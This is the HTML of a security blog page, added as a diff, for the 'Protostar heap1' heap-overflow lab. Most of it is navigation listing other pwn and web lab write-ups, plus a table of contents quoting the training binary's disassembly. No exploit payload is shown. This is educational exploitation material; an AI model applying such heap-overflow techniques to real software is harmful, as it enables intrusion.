@@ -1,0 +1,1621 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../Protostar_heap0/">
+      
+      
+        <link rel="next" href="../Protostar_stack0/">
+      
+      
+        <link rel="alternate" type="application/rss+xml" title="RSS feed" href="../../feed_rss_created.xml">
+        <link rel="alternate" type="application/rss+xml" title="RSS feed of updated content" href="../../feed_rss_updated.xml">
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.20">
+    
+    
+      
+        <title>Protostar heap1 - DarkLord-W's Blog</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.e53b48f4.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#heap-one-this-level-takes-a-look-at-code-flow-hijacking-in-data-overwrite-cases-this-level-is-at-optprotostarbinheap1" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="DarkLord-W&#39;s Blog" class="md-header__button md-logo" aria-label="DarkLord-W's Blog" data-md-component="logo">
+      
+  <img src="https://avatars.githubusercontent.com/u/42199147" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            DarkLord-W's Blog
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Protostar heap1
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="DarkLord-W&#39;s Blog" class="md-nav__button md-logo" aria-label="DarkLord-W's Blog" data-md-component="logo">
+      
+  <img src="https://avatars.githubusercontent.com/u/42199147" alt="logo">
+
+    </a>
+    DarkLord-W's Blog
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Home
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    PortSwigger Academy
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            PortSwigger Academy
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../PortSwigger-Academy/File%20upload%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    File upload vulnerabilities
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Pwn
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Pwn
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Protostar_format0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Protostar format0
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Protostar_format1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Protostar format1
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Protostar_format2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Protostar format2
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Protostar_heap0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Protostar heap0
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Protostar heap1
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    Protostar heap1
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#heap-one-this-level-takes-a-look-at-code-flow-hijacking-in-data-overwrite-cases-this-level-is-at-optprotostarbinheap1" class="md-nav__link">
+    <span class="md-ellipsis">
+      # Heap One This level takes a look at code flow hijacking in data overwrite cases. This level is at /opt/protostar/bin/heap1
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pwndbg-disass-winner-dump-of-assembler-code-for-function-winner-0x08048494-0-push-ebp-0x08048495-1-mov-ebpesp-0x08048497-3-sub-esp0x18-0x0804849a-6-mov-dword-ptr-esp0x0-0x080484a1-13-call-0x80483ac-timeplt-0x080484a6-18-mov-edx0x8048630-0x080484ab-23-mov-dword-ptr-esp0x4eax-0x080484af-27-mov-dword-ptr-espedx-0x080484b2-30-call-0x804839c-printfplt-0x080484b7-35-leave-0x080484b8-36-ret-end-of-assembler-dump-pwndbg-disass-ma-main-malloc-mallocgotplt-mallocplt-pwndbg-disass-main-dump-of-assembler-code-for-function-main-0x080484b9-0-push-ebp-0x080484ba-1-mov-ebpesp-0x080484bc-3-and-esp0xfffffff0-0x080484bf-6-sub-esp0x20-0x080484c2-9-mov-dword-ptr-esp0x8-0x080484c9-16-call-0x80483bc-mallocplt-0x080484ce-21-mov-dword-ptr-esp0x14eax-0x080484d2-25-mov-eaxdword-ptr-esp0x14-0x080484d6-29-mov-dword-ptr-eax0x1-0x080484dc-35-mov-dword-ptr-esp0x8-0x080484e3-42-call-0x80483bc-mallocplt-0x080484e8-47-mov-edxeax-0x080484ea-49-mov-eaxdword-ptr-esp0x14-0x080484ee-53-mov-dword-ptr-eax0x4edx-0x080484f1-56-mov-dword-ptr-esp0x8-0x080484f8-63-call-0x80483bc-mallocplt-0x080484fd-68-mov-dword-ptr-esp0x18eax-0x08048501-72-mov-eaxdword-ptr-esp0x18-0x08048505-76-mov-dword-ptr-eax0x2-0x0804850b-82-mov-dword-ptr-esp0x8-0x08048512-89-call-0x80483bc-mallocplt-0x08048517-94-mov-edxeax-0x08048519-96-mov-eaxdword-ptr-esp0x18-0x0804851d-100-mov-dword-ptr-eax0x4edx-0x08048520-103-mov-eaxdword-ptr-ebp0xc-0x08048523-106-add-eax0x4-0x08048526-109-mov-eaxdword-ptr-eax-0x08048528-111-mov-edxeax-0x0804852a-113-mov-eaxdword-ptr-esp0x14-0x0804852e-117-mov-eaxdword-ptr-eax0x4-0x08048531-120-mov-dword-ptr-esp0x4edx-0x08048535-124-mov-dword-ptr-espeax-0x08048538-127-call-0x804838c-strcpyplt-0x0804853d-132-mov-eaxdword-ptr-ebp0xc-0x08048540-135-add-eax0x8-0x08048543-138-mov-eaxdword-ptr-eax-0x08048545-140-mov-edxeax-0x08048547-142-mov-eaxdword-ptr-esp0x18-0x0804854b-146-mov-eaxdword-ptr-eax0x4-0x0804854e-149-mov-dword-ptr-esp0x4edx-0x08048552-153-mov-dword-ptr-espeax-0x08048555-156-call-0x804838c-strcpyplt-0x0804855a-161-mov-dword-ptr-esp0x804864b-0x08048561-168-call-0x80483cc-putsplt-0x08048566-173-leave-0x08048567-174-ret-end-of-assembler-dump" class="md-nav__link">
+    <span class="md-ellipsis">
+      pwndbg&gt; disass winner Dump of assembler code for function winner: 0x08048494 &lt;+0&gt;: push ebp 0x08048495 &lt;+1&gt;: mov ebp,esp 0x08048497 &lt;+3&gt;: sub esp,0x18 0x0804849a &lt;+6&gt;: mov DWORD PTR [esp],0x0 0x080484a1 &lt;+13&gt;: call 0x80483ac &lt;time@plt&gt; 0x080484a6 &lt;+18&gt;: mov edx,0x8048630 0x080484ab &lt;+23&gt;: mov DWORD PTR [esp+0x4],eax 0x080484af &lt;+27&gt;: mov DWORD PTR [esp],edx 0x080484b2 &lt;+30&gt;: call 0x804839c &lt;printf@plt&gt; 0x080484b7 &lt;+35&gt;: leave 0x080484b8 &lt;+36&gt;: ret End of assembler dump. pwndbg&gt; disass ma main malloc malloc@got[plt] malloc@plt pwndbg&gt; disass main Dump of assembler code for function main: 0x080484b9 &lt;+0&gt;: push ebp 0x080484ba &lt;+1&gt;: mov ebp,esp 0x080484bc &lt;+3&gt;: and esp,0xfffffff0 0x080484bf &lt;+6&gt;: sub esp,0x20 0x080484c2 &lt;+9&gt;: mov DWORD PTR [esp],0x8 0x080484c9 &lt;+16&gt;: call 0x80483bc &lt;malloc@plt&gt; 0x080484ce &lt;+21&gt;: mov DWORD PTR [esp+0x14],eax 0x080484d2 &lt;+25&gt;: mov eax,DWORD PTR [esp+0x14] 0x080484d6 &lt;+29&gt;: mov DWORD PTR [eax],0x1 0x080484dc &lt;+35&gt;: mov DWORD PTR [esp],0x8 0x080484e3 &lt;+42&gt;: call 0x80483bc &lt;malloc@plt&gt; 0x080484e8 &lt;+47&gt;: mov edx,eax 0x080484ea &lt;+49&gt;: mov eax,DWORD PTR [esp+0x14] 0x080484ee &lt;+53&gt;: mov DWORD PTR [eax+0x4],edx 0x080484f1 &lt;+56&gt;: mov DWORD PTR [esp],0x8 0x080484f8 &lt;+63&gt;: call 0x80483bc &lt;malloc@plt&gt; 0x080484fd &lt;+68&gt;: mov DWORD PTR [esp+0x18],eax 0x08048501 &lt;+72&gt;: mov eax,DWORD PTR [esp+0x18] 0x08048505 &lt;+76&gt;: mov DWORD PTR [eax],0x2 0x0804850b &lt;+82&gt;: mov DWORD PTR [esp],0x8 0x08048512 &lt;+89&gt;: call 0x80483bc &lt;malloc@plt&gt; 0x08048517 &lt;+94&gt;: mov edx,eax 0x08048519 &lt;+96&gt;: mov eax,DWORD PTR [esp+0x18] 0x0804851d &lt;+100&gt;: mov DWORD PTR [eax+0x4],edx 0x08048520 &lt;+103&gt;: mov eax,DWORD PTR [ebp+0xc] 0x08048523 &lt;+106&gt;: add eax,0x4 0x08048526 &lt;+109&gt;: mov eax,DWORD PTR [eax] 0x08048528 &lt;+111&gt;: mov edx,eax 0x0804852a &lt;+113&gt;: mov eax,DWORD PTR [esp+0x14] 0x0804852e &lt;+117&gt;: mov eax,DWORD PTR [eax+0x4] 0x08048531 &lt;+120&gt;: mov DWORD PTR [esp+0x4],edx 0x08048535 &lt;+124&gt;: mov DWORD PTR [esp],eax 0x08048538 &lt;+127&gt;: call 0x804838c &lt;strcpy@plt&gt; 0x0804853d &lt;+132&gt;: mov eax,DWORD PTR [ebp+0xc] 0x08048540 &lt;+135&gt;: add eax,0x8 0x08048543 &lt;+138&gt;: mov eax,DWORD PTR [eax] 0x08048545 &lt;+140&gt;: mov edx,eax 0x08048547 &lt;+142&gt;: mov eax,DWORD PTR [esp+0x18] 0x0804854b &lt;+146&gt;: mov eax,DWORD PTR [eax+0x4] 0x0804854e &lt;+149&gt;: mov DWORD PTR [esp+0x4],edx 0x08048552 &lt;+153&gt;: mov DWORD PTR [esp],eax 0x08048555 &lt;+156&gt;: call 0x804838c &lt;strcpy@plt&gt; 0x0804855a &lt;+161&gt;: mov DWORD PTR [esp],0x804864b 0x08048561 &lt;+168&gt;: call 0x80483cc &lt;puts@plt&gt; 0x08048566 &lt;+173&gt;: leave 0x08048567 &lt;+174&gt;: ret End of assembler dump.
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Protostar_stack0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Protostar_stack0
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Protostar_stack1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Protostar_stack1
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Protostar_stack2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Protostar_stack2
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Protostar_stack3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Protostar_stack3
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Protostar_stack4/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Protostar_stack4
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Protostar_stack5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Protostar stack5
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Protostar_stack6/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Protostar stack6
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Protostar_stack7/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Protostar stack7
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../bamboofox-ret2syscall-rop/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    bamboofox-ret2syscall-rop
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../pwn-sniper-01/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    pwn-sniper-01
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../pwn-sniper-02/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    pwn-sniper-02
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../pwn-sniper-03/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    pwn-sniper-03
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../pwnable--bof/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    pwnable--bof
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../pwnable--collision/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    pwnable--collision
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../pwnable--fd%20--%20%28File%20descriptor%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    pwnable--fd -- (File descriptor)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../pwnable--flag--%28reverse%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    pwnable--flag--(reverse)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../pwnable--input/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    pwnable--input
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../pwnable--passcode/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    pwnable--passcode
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../pwnable--random/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    pwnable--random
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ret2shellcode/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    ret2shellcode
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../stack_test/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    stack_test
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../xctf--pwn--%E5%8F%8D%E5%BA%94%E9%87%9C%E5%BC%80%E5%85%B3%E6%8E%A7%E5%88%B6/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    xctf--pwn--反应釜开关控制
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Web
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            Web
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    ATTCK红队评估01
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B002/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    ATTCK红队评估02
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/HTB%20Pilgrimage/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    HTB Pilgrimage
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/tryhackme%20-%20Overpass/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    tryhackme - Overpass
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/vulhub%20%20%20%20DC-9/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    vulhub    DC-9
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/vulhub%20%20%20%20DIGITALWORLD.LOCAL_%20BRAVERY/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    vulhub    DIGITALWORLD.LOCAL: BRAVERY
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
